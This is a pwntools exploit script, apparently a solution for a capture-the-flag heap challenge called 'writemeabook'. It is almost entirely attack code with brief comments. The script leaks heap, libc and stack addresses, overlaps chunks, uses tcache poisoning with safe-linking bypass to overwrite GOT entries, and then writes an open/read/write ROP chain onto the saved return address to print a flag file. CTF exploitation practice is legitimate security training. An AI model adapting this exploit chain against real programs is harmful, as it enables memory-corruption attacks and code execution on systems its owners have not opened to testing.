from pwn import *
context.binary=exe=ELF('./chall',checksec=False)
libc=ELF('/home/dqp/greyhat_CTF/writemeabook/dist/lib/libc.so.6',checksec=False)
p=process(exe.path)
host = '34.124.157.94'
port = 12346
#p=remote(host,port)
def add(idx, data: bytes):
        p.sendlineafter(b"Option: ", b"1")
        p.sendlineafter(b"Index: ", str(idx).encode())
        p.sendlineafter(b"Write me a book no more than 32 characters long!\n", data)

def edit(idx, data):
    p.sendlineafter(b"Option: ", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendafter(b"Write me the new contents of your book that is no longer than what it was before.\n", data)

def free(idx):
    p.sendlineafter(b"Option: ", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())

p.sendlineafter(b"> ",b"A"*5+p8(0x41))


add(1,b"A"*32)
add(2,b"")
fakechunk=flat(
	0,0,
	0,0x21
	)
add(3,fakechunk)
add(4,b"A"*32)
p.sendlineafter(b"Option: ",b"1337")
p.sendlineafter(b"What is your favourite number? ",b"1")
p.recvuntil(b"You found a secret message: ")
leak=int(p.recvline()[:-1],16)
log.info('[+]leak heap:'+hex(leak))
heap=leak-0x3d10
log.info('[+]heap base:'+hex(heap))



free(4) #tcache 0x40 index 1

edit(1,b"A"*0x30)
free(2)# tcache 0x40 index 2 has been change size from 0x21 to 0x41
#* fake size chunk 
payload=flat(
	1,1,
	0,0x41
	)

add(2,payload) # take chunk 2 out but now it's size 0x41
free(3) # victim chunks which has been overlap by chunk2


#* tcache poinson 
payload=flat(
	0,0,
	0,0x41,
	p64((heap+0x3d70)>>12^exe.sym['secret_msg'])
	)
edit(2,payload)
add(3,b"A"*32) # take chunk3 out
chunk3=heap+0x3d70
chunk2=heap+0x3d50
add(10,flat(0,0,0x30,chunk3))# turn mesage into 0 so we can leak address
#*leak libc
add(4,b"A"*32)
free(4)# tcahe 0x41 index 1
free(3)
payload=flat(
	0,0,
	0,0x41,
	p64((heap+0x3d70)>>12^exe.sym['books'])
	)
edit(2,payload)
add(3,b"A"*32) # take chunk3 out
add(9,flat(0x30,exe.got['printf'],0x30,chunk2))
# stage2 of leak libc : overwrite free to printf

add(4,b"A"*32)
free(4)# tcahe 0x41 index 1
free(3)
payload=flat(
	0,0,
	0,0x41,
	p64((heap+0x3d70)>>12^(0x404018-0x18))# free got-0x18
	)
edit(2,payload)
add(3,b"A"*32) # take chunk3 out

add(8,flat(0,0,0,exe.plt['printf']))
free(1)
libc_leak=int.from_bytes(p.recvuntil(b"Your book has been thrown!",drop=True),'little')
log.info('[+]libc Leak:'+hex(libc_leak))
libc.address=libc_leak-libc.sym['printf']
log.info('[+]libc base:'+hex(libc.address))

# leak libc thanhf cong

#* leak stack
payload=flat(0x30,libc.sym['environ'],p64(0x30),p64(chunk2))
edit(9,payload)
free(1)
stack=int.from_bytes(p.recvuntil(b"Your book has been thrown!",drop=True),'little')
log.info('[+]Stack Leak:'+hex(stack))
saved_rip_main=stack-0x120


### over write free.got to free

edit(8,flat(0,0,0,libc.sym['free']))
payload=flat(
	b"./flag\x00\x00",0,
	0,0x41,
	p64((heap+0x3d70)>>12^(saved_rip_main-8))# free got-0x18
	)
edit(2,payload)
### over write size of chunk1 and point chunk1 to saved rip of main
pop_rdi=libc.address+0x000000000002a3e5
mov_rax_rdi=libc.address+0x000000000013588f
pop_rax=libc.address+0x0000000000045eb0
pop_rsi=libc.address+0x00000000001303b2
pop_rdx_r12=libc.address+0x000000000011f497
syscall_ret=libc.address+0x0000000000091396
payload=flat(0x500,saved_rip_main)
edit(9,payload)

ROP=flat(
	pop_rax,2,
	pop_rsi,0,
	pop_rdi,chunk2,
	syscall_ret,
	# sysread
	#0x000000000005a2c1,# cli; mov rdi, rax; cmp rdx, rcx; jae 0x5a2ac; mov rax, r8; ret;
	pop_rax,0,
	pop_rsi,0x00000000404a00, #read write section
	pop_rdx_r12,100,0,
	pop_rdi,3,
	syscall_ret,

	pop_rax,1,
	pop_rsi,0x00000000404a00,#read write section
	pop_rdi,1,
	syscall_ret
	)

edit(1,ROP)
p.sendlineafter(b"Option: ",b"4")

p.interactive()